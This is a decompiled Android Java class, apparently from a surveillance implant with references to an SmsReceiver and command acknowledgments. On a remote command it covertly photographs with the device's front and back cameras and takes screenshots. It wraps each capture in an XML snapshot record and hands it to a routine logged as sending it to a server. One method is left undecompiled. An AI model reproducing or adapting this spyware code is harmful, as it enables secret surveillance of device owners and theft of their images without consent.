package com.network.media;

import android.content.Context;
import android.hardware.Camera;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.j;
import com.network.b.b;
import java.io.StringWriter;
import java.util.Vector;
import org.xmlpull.v1.XmlSerializer;

public final class a {

    /* renamed from: a  reason: collision with root package name */
    static boolean f162a = true;
    private static boolean b = false;
    private static Vector c = new Vector();
    private static Handler d;
    private static String e;
    private static Camera f = null;
    private static Camera.PreviewCallback g = null;

    static {
        HandlerThread handlerThread = new HandlerThread("CameraHandlerThread");
        handlerThread.start();
        d = new Handler(handlerThread.getLooper());
    }

    static /* synthetic */ Camera.PreviewCallback a(int i, String str, int i2) {
        return new b(i2, i, str);
    }

    public static void a() {
        try {
            com.network.android.c.a.a.a("CameraUtil stop camera started. _camera value: " + f);
            if (f != null) {
                f.setPreviewCallback(null);
                f.stopPreview();
                f.release();
                f = null;
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("CameraUtil stop Exception- " + th.getMessage(), th);
        }
    }

    /* access modifiers changed from: private */
    public static void a(int i, long j, boolean z, String str, int i2) {
        d.postDelayed(new c(), 90000);
        d.postDelayed(new d(z, i, str, i2), j);
    }

    /* JADX WARNING: Removed duplicated region for block: B:21:0x00bb A[SYNTHETIC, Splitter:B:21:0x00bb] */
    /* JADX WARNING: Removed duplicated region for block: B:56:0x0274 A[SYNTHETIC, Splitter:B:56:0x0274] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static synchronized void a(android.content.Context r10, java.lang.String r11, int r12) {
        /*
        // Method dump skipped, instructions count: 712
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.media.a.a(android.content.Context, java.lang.String, int):void");
    }

    public static synchronized void a(Context context, String str, int i, int i2) {
        boolean z = true;
        synchronized (a.class) {
            try {
                com.network.android.c.a.a.a("CameraUtil take Photo commandAck: " + str + " , sourceType: " + i + " ,resolution: " + i2);
                e = str;
                boolean z2 = (i & 1) == 1;
                boolean z3 = (i & 2) == 2;
                if ((i & 4) != 4) {
                    z = false;
                }
                com.network.android.c.a.a.a("CameraUtil take Photo front: " + z2 + ", back " + z3 + ", screenshot:" + z);
                if (z) {
                    com.network.android.c.a.a.a("CameraUtil takeScreenShot");
                    if (b.c()) {
                        a(context, str, i2);
                    } else if (str != null) {
                        com.network.android.c.a.b.a(1, 25, "LOG_CAMERA_SNAPSHOT_FAILED", com.network.h.b.c(str));
                        com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(str));
                    }
                }
                if (z2) {
                    com.network.android.c.a.a.a("CameraUtil front");
                    a(i2, 100, true, str, 1);
                }
                if (z3) {
                    com.network.android.c.a.a.a("CameraUtil back");
                    long j = 100;
                    if (z2) {
                        j = 3000;
                    }
                    a(i2, j, false, str, 2);
                }
            } catch (Throwable th) {
                com.network.android.c.a.a.a("CameraUtil takePhoto Exception- " + th.getMessage(), th);
                com.network.android.c.a.b.b(1, 25, "LOG_CAMERA_SNAPSHOT_FAILED", com.network.h.b.c(str));
                com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(str));
            }
        }
        return;
    }

    public static void a(Context context, byte[] bArr, String str, String str2, String str3, int i, String str4) {
        XmlSerializer newSerializer = Xml.newSerializer();
        StringWriter stringWriter = new StringWriter();
        SmsReceiver.a(newSerializer, stringWriter);
        newSerializer.startTag("", "snapshots");
        newSerializer.startTag("", "snapshot");
        newSerializer.attribute("", "file", str2);
        newSerializer.attribute("", "contentType", str4);
        newSerializer.attribute("", "length", String.valueOf(bArr.length));
        newSerializer.attribute("", "isCompressed", "false");
        newSerializer.attribute("", "commandAck", str3);
        newSerializer.attribute("", "timestamp", str);
        newSerializer.attribute("", "source", String.valueOf(i));
        newSerializer.endTag("", "snapshot");
        newSerializer.endTag("", "snapshots");
        SmsReceiver.a(newSerializer);
        String stringWriter2 = stringWriter.toString();
        com.network.android.c.a.a.a("CameraUtil To Server");
        com.network.android.c.a.a.a("CameraUtil To Server - Data list size");
        j.a(context, stringWriter2, new String[]{str2}, new byte[][]{bArr});
    }

    static /* synthetic */ Camera c() {
        com.network.android.c.a.a.a("CameraUtil takePhoto getNumberOfCameras: " + Camera.getNumberOfCameras());
        Camera camera = null;
        for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            Camera.getCameraInfo(i, cameraInfo);
            if (cameraInfo.facing == 1) {
                camera = Camera.open(i);
            }
        }
        return camera;
    }
}
